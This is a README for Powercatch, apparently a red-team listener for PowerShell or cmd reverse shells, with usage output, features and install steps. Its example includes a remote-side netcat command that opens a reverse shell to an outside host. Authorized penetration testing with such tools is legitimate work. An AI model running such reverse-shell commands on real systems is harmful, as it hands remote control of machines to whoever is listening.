# Powercatch

Listen for (powershell.exe || cmd.exe) reverse shells!

### Example:
Remote Machine:
```
PS C:\Windows\system32> nc.exe 10.10.10.1 9000 -e powershell
```
Local Machine:
```
$ powercatch 9000
[*] listening on 0.0.0.0:9000
[*] Accepted connection from 10.10.10.95 on port 49988
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Users\redteam\Desktop> PowerHelp

Commands:
  PowerHelp              Display this menu
  clear                  Clear the screen
  cls                    Clear the screen
  exit                   Use exit command if you are in nested shell eg: if you called cmd within powershell
  quit                   Quits program

Key Combinations:
  Ctrl + \               For Directory completion (Makes a directory request on each key-combination press)
                         eg: PS > dir -Force <Ctrl + \>
  Ctrl + c               Cancels command so that you can try again
  Ctrl + d               Quits program

Future Commands To be Implemented:
  PowerDownload          Download remote file eg: PowerDownload <remote_dir> <local_dir>
  PowerUpload            Upload local file eg: PowerUpload <local_dir> <remote_dir>

PS C:\Users\redteam\Desktop> 
```

## Features:
 - Tab completion 
 - (Ctrl-l or "clear" or "cls") clears the screen
 - History
 - File and Folder completion with Ctrl + \ (Makes a directory request on each key-combination press)
 - Type "PowerHelp" for Powercatch help commands (command not sent over the network)

### TODO:
- Add upload and download functionality

### Install
```
$ git clone https://github.com/postrequest/powercatch.git
$ cd powercatch/
$ pip3 install prompt_toolkit
$ ./powercatch
```
